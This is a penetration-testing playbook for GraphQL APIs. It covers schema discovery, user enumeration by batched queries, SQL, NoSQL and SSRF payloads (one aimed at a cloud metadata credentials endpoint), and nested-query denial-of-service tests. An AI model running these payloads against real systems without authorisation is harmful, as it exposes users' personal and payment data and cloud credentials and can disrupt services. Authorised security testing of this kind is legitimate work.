# Playbook: GraphQL attack chain

GraphQL's flexibility is also its attack surface. A single endpoint accepts queries of arbitrary
complexity, operations are defined by the client rather than the server, and the schema is
self-describing. These properties make GraphQL faster to develop with and faster to attack.

## Objective

Map the complete GraphQL schema, identify operations with insufficient authorisation, and test
for injection, information disclosure, and denial of service via query complexity abuse.

## Prerequisites

- Target GraphQL endpoint URL.
- Burp Suite with InQL extension.
- GraphQL Voyager for schema visualisation.
- Clairvoyance for schema extraction when introspection is disabled.
- At least one valid account, ideally at multiple privilege levels.
- Postman or Insomnia for query building.

## Phase 1: Endpoint and schema discovery

Find the GraphQL endpoint. Check all common paths:

```bash
for path in /graphql /api/graphql /v1/graphql /query /gql /graphiql /playground; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' \
    "https://target.com${path}")
  [ "$status" = "200" ] && echo "FOUND: ${path}"
done
```

A `200` response to `{__typename}` confirms the endpoint is live.

### Attempt introspection

```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind } } }"}' | python3 -m json.tool
```

If introspection succeeds, run the full introspection query and save the result. Import it into
GraphQL Voyager and InQL before proceeding.

### When introspection is disabled

Test field suggestions. GraphQL servers often return "did you mean X?" suggestions when an
unknown field is queried. These suggestions reveal valid field names:

```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usr { id } }"}' | python3 -m json.tool
# Look for: "Cannot query field 'usr' on type 'Query'. Did you mean 'user'?"
```

Run Clairvoyance to systematically extract the schema using suggestions:

```bash
python3 -m clairvoyance -t https://target.com/graphql -w wordlist.txt -o schema.json
```

Use InQL to generate queries from whatever schema has been recovered:

```bash
inql -t https://target.com/graphql -o output/
```

## Phase 2: Schema analysis

With the schema available, identify the operations worth targeting.

### Queries to prioritise

Look for queries that:
- Return lists of users, accounts, or sensitive resources (BOLA risk when filtered by ID)
- Accept an identifier parameter and return a single resource
- Are not listed in public documentation but appear in the schema
- Have names suggesting administrative or internal use: `adminUsers`, `systemConfig`, `debugInfo`

### Mutations to prioritise

Look for mutations that:
- Modify user attributes, particularly role, permissions, or payment information
- Create or delete resources on behalf of a specified user ID
- Have names suggesting privilege escalation: `updateRole`, `grantPermission`, `resetPassword`
- Accept a `userId` or similar parameter distinct from the authenticated user's identity

## Phase 3: Authorisation testing

GraphQL resolvers must independently verify that the authenticated user has permission to access
each field and perform each operation. When this check is missing or inconsistent, authorisation
is broken at the field level.

### BOLA via query parameter

Test whether the authenticated user can query another user's data by specifying their ID:

```graphql
query {
  user(id: "OTHER_USER_ID") {
    email
    phone
    paymentMethods {
      last4
      expiryDate
    }
  }
}
```

### Batch query enumeration

GraphQL allows multiple operations in a single request. Use this to enumerate many resource IDs
efficiently without making separate HTTP requests:

```graphql
query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
}
```

Automate this for a range of IDs:

```python
import requests, json

endpoint = "https://target.com/graphql"
token = "YOUR_TOKEN"
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

aliases = {f"u{i}": {"id": str(i)} for i in range(1, 101)}
query = "query { " + " ".join(
    f'u{i}: user(id: "{i}") {{ id email name }}' for i in range(1, 101)
) + " }"

resp = requests.post(endpoint, headers=headers, json={"query": query})
data = resp.json().get("data", {})
for alias, result in data.items():
    if result:
        print(alias, result)
```

### Field-level authorisation

GraphQL resolvers are often written with access checks on the top-level query but not on
individual fields. A user who is authorised to query `order(id: X)` may be authorised to see
the order ID but not the full payment details. Test whether sensitive fields on authorised objects
are also properly restricted:

```graphql
query {
  order(id: "MY_ORDER_ID") {
    id
    total
    paymentMethod {
      cardNumber
      cvv
      billingAddress
    }
    user {
      id
      email
      allOrders {
        id
        total
      }
    }
  }
}
```

## Phase 4: Injection testing

### SQL injection via GraphQL arguments

GraphQL arguments that map to database queries are injection targets. Test with common SQLi
payloads in string arguments:

```graphql
query {
  searchProducts(name: "test' OR '1'='1") {
    id
    name
    price
  }
}
```

Observe whether the response changes, returns additional records, or produces an error revealing
database structure.

### SSRF via URL arguments

Mutations or queries that accept URL arguments may be vulnerable to SSRF if the server fetches
the URL server-side:

```graphql
mutation {
  importFromUrl(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
    result
  }
}
```

### NoSQL injection

GraphQL APIs backed by MongoDB or similar are vulnerable to NoSQL injection when arguments are
passed directly to query builders:

```
query {
  user(email: {"$gt": ""}) {
    id
    email
    passwordHash
  }
}
```

## Phase 5: Denial of service via query complexity

GraphQL allows deeply nested queries. Without depth or complexity limits, a single request can
generate an enormous amount of server-side computation.

Test whether depth limits are in place:

```
query {
  user {
    friends {
      friends {
        friends {
          friends {
            friends {
              id email
            }
          }
        }
      }
    }
  }
}
```

Test whether circular references produce infinite loops:

```
query {
  user {
    orders {
      user {
        orders {
          user {
            id
          }
        }
      }
    }
  }
}
```

These queries are useful for demonstrating the absence of resource protection controls. Do not
send them at a volume that constitutes a denial of service against the target.

## Output

- Complete GraphQL schema (from introspection or Clairvoyance).
- List of queries and mutations with their authorisation status.
- BOLA findings: queries that return other users' data.
- Field-level authorisation gaps.
- Injection findings with example payloads.
- Query complexity and depth limit status.

## Techniques

- [API surface discovery](../notes/recon.md)
- [Schema analysis](../runbooks/schema-analysis.md)
- [BOLA and BFLA testing](../runbooks/bola-bfla.md)
- [Authentication testing](../runbooks/auth-testing.md)
